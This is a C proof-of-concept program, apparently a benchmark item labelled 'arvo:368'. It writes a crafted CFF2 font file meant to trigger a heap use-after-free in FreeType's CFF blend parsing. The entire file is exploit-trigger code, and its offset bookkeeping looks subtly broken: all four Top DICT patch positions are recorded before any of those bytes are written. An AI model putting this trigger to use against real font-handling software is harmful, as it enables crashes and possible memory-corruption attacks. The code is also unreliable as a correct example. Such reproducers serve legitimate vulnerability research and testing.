#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* PoC for arvo:368 */
/* Triggers: heap-use-after-free in cff_parse_num (FreeType CFF blend) */
/* Vuln class: use_after_free */

static void write_uint8(FILE *f, uint8_t v) {
    fputc(v, f);
}

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff2_index_empty(FILE *f) {
    write_uint32(f, 0);
}

static void write_cff2_index(FILE *f, const unsigned char *data, uint32_t len) {
    uint32_t i;
    uint32_t offSize;
    uint32_t total_size;
    uint32_t offset_val;

    if (len == 0) {
        write_cff2_index_empty(f);
        return;
    }

    total_size = len + 1;
    if (total_size <= 0xFF)
        offSize = 1;
    else if (total_size <= 0xFFFF)
        offSize = 2;
    else
        offSize = 4;

    write_uint32(f, 1);
    write_uint8(f, offSize);

    offset_val = 1;
    for (i = 0; i < offSize; i++) {
        fputc((offset_val >> (8 * (offSize - 1 - i))) & 0xFF, f);
    }
    offset_val = len + 1;
    for (i = 0; i < offSize; i++) {
        fputc((offset_val >> (8 * (offSize - 1 - i))) & 0xFF, f);
    }

    fwrite(data, 1, len, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header (OTTO) */
    write_uint32(f, 0x4F54544F);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 0);
    write_uint16(f, 0);

    /* Table record for 'CFF2' */
    write_uint32(f, 0x43464632);
    write_uint32(f, 0);
    uint32_t cff_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint32(f, 0);

    uint32_t cff_start = ftell(f);

    /* CFF2 Header */
    write_uint8(f, 0x02);
    write_uint8(f, 0x00);
    write_uint8(f, 0x05);
    uint32_t top_dict_len_pos = ftell(f);
    write_uint16(f, 0);

    /* Top DICT */
    unsigned char top_dict[256];
    uint32_t top_dict_len = 0;

    uint32_t vstore_offset_pos = ftell(f);
    top_dict[top_dict_len++] = 0x1C;
    top_dict[top_dict_len++] = 0xFF;
    top_dict[top_dict_len++] = 0xFF;
    top_dict[top_dict_len++] = 0x18;

    uint32_t fdselect_offset_pos = ftell(f);
    top_dict[top_dict_len++] = 0x1C;
    top_dict[top_dict_len++] = 0xFF;
    top_dict[top_dict_len++] = 0xFF;
    top_dict[top_dict_len++] = 0x0C;
    top_dict[top_dict_len++] = 0x25;

    uint32_t fdarray_offset_pos = ftell(f);
    top_dict[top_dict_len++] = 0x1C;
    top_dict[top_dict_len++] = 0xFF;
    top_dict[top_dict_len++] = 0xFF;
    top_dict[top_dict_len++] = 0x0C;
    top_dict[top_dict_len++] = 0x24;

    uint32_t charstrings_offset_pos = ftell(f);
    top_dict[top_dict_len++] = 0x1C;
    top_dict[top_dict_len++] = 0xFF;
    top_dict[top_dict_len++] = 0xFF;
    top_dict[top_dict_len++] = 0x11;

    fwrite(top_dict, 1, top_dict_len, f);

    uint32_t end_top_dict = ftell(f);
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_uint16(f, (uint16_t)(end_top_dict - (top_dict_len_pos + 2)));
    fseek(f, end_top_dict, SEEK_SET);

    write_cff2_index_empty(f);

    uint32_t charstrings_start = ftell(f);
    unsigned char charstring_data[1] = {0x0E};
    write_cff2_index(f, charstring_data, 1);

    uint32_t fdselect_start = ftell(f);
    write_uint8(f, 0);
    write_uint16(f, 1);
    write_uint8(f, 0);

    uint32_t vstore_start = ftell(f);
    write_uint16(f, 1);
    write_uint32(f, 12);
    write_uint16(f, 1);
    write_uint32(f, 22);
    write_uint16(f, 1);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 0x4000);
    write_uint16(f, 0x4000);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 1);
    write_uint16(f, 0);

    /* Private DICT */
    unsigned char private_dict[256];
    uint32_t private_dict_len = 0;

    private_dict[private_dict_len++] = 0x8B;
    private_dict[private_dict_len++] = 0x16;

    /* First blend: numBlends=10 */
    private_dict[private_dict_len++] = 0x1C;
    private_dict[private_dict_len++] = 0x00;
    private_dict[private_dict_len++] = 0x0A;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x64;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x65;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x66;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x67;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x68;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x69;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x6A;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x6B;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x6C;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x6D;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x17;

    /* Second blend: numBlends=5 */
    private_dict[private_dict_len++] = 0x1C;
    private_dict[private_dict_len++] = 0x00;
    private_dict[private_dict_len++] = 0x05;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x2C;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x2D;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x2E;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x2F;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x30;
    private_dict[private_dict_len++] = 0x1C; private_dict[private_dict_len++] = 0x00; private_dict[private_dict_len++] = 0x01;
    private_dict[private_dict_len++] = 0x17;

    /* 14 ForceBold operators (0x0B) to pop all 14 stack entries */
    int i;
    for (i = 0; i < 14; i++) {
        private_dict[private_dict_len++] = 0x0B;
    }

    uint32_t private_dict_start = ftell(f);
    fwrite(private_dict, 1, private_dict_len, f);

    uint32_t private_dict_offset = private_dict_start - cff_start;
    uint32_t private_dict_size = private_dict_len;

    unsigned char font_dict_data[32];
    uint32_t font_dict_len = 0;

    if (private_dict_size <= 107) {
        font_dict_data[font_dict_len++] = (unsigned char)(private_dict_size + 139);
    } else {
        font_dict_data[font_dict_len++] = 0x1C;
        font_dict_data[font_dict_len++] = (private_dict_size >> 8) & 0xFF;
        font_dict_data[font_dict_len++] = private_dict_size & 0xFF;
    }

    if (private_dict_offset <= 107) {
        font_dict_data[font_dict_len++] = (unsigned char)(private_dict_offset + 139);
    } else {
        font_dict_data[font_dict_len++] = 0x1C;
        font_dict_data[font_dict_len++] = (private_dict_offset >> 8) & 0xFF;
        font_dict_data[font_dict_len++] = private_dict_offset & 0xFF;
    }

    font_dict_data[font_dict_len++] = 0x12;

    uint32_t fdarray_start = ftell(f);
    write_cff2_index(f, font_dict_data, font_dict_len);

    uint32_t fdarray_offset = fdarray_start - cff_start;
    fseek(f, fdarray_offset_pos, SEEK_SET);
    write_uint8(f, 0x1C);
    write_uint16(f, (uint16_t)fdarray_offset);
    fseek(f, 0, SEEK_END);

    uint32_t fdselect_offset = fdselect_start - cff_start;
    fseek(f, fdselect_offset_pos, SEEK_SET);
    write_uint8(f, 0x1C);
    write_uint16(f, (uint16_t)fdselect_offset);
    fseek(f, 0, SEEK_END);

    uint32_t charstrings_offset = charstrings_start - cff_start;
    fseek(f, charstrings_offset_pos, SEEK_SET);
    write_uint8(f, 0x1C);
    write_uint16(f, (uint16_t)charstrings_offset);
    fseek(f, 0, SEEK_END);

    uint32_t vstore_offset = vstore_start - cff_start;
    fseek(f, vstore_offset_pos, SEEK_SET);
    write_uint8(f, 0x1C);
    write_uint16(f, (uint16_t)vstore_offset);
    write_uint8(f, 0x18);
    fseek(f, 0, SEEK_END);

    uint32_t cff_end = ftell(f);
    fseek(f, cff_offset_pos, SEEK_SET);
    write_uint32(f, cff_start);
    write_uint32(f, cff_end - cff_start);

    fclose(f);
    return 0;
}